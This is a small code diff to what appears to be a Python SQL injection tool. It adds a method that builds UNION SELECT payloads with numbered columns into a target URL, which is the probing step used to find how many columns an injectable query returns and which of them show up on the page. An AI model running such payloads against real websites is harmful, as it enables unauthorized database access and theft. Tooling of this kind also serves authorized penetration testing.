@@ -23,6 +23,11 @@ class Builder:
         self.union_string = self.delimiter + 'UNION' + self.delimiter + 'SELECT' 
         self.null_url = page.split('=')[0] + '=null'
 
+    def magic_num_string(self, num_cols):
+        cols = [self.delimiter + str(i + self.offset) for i in xrange(1, num_cols + 1)]
+        return self.null_url + self.union_string + ','.join(cols)
+
+
     def union_nums(self, num_cols):
         """ Creates the part of the SQLI after 'UNION SELECT'.
             :num_cols: Number of columns in vulnerable statement. 
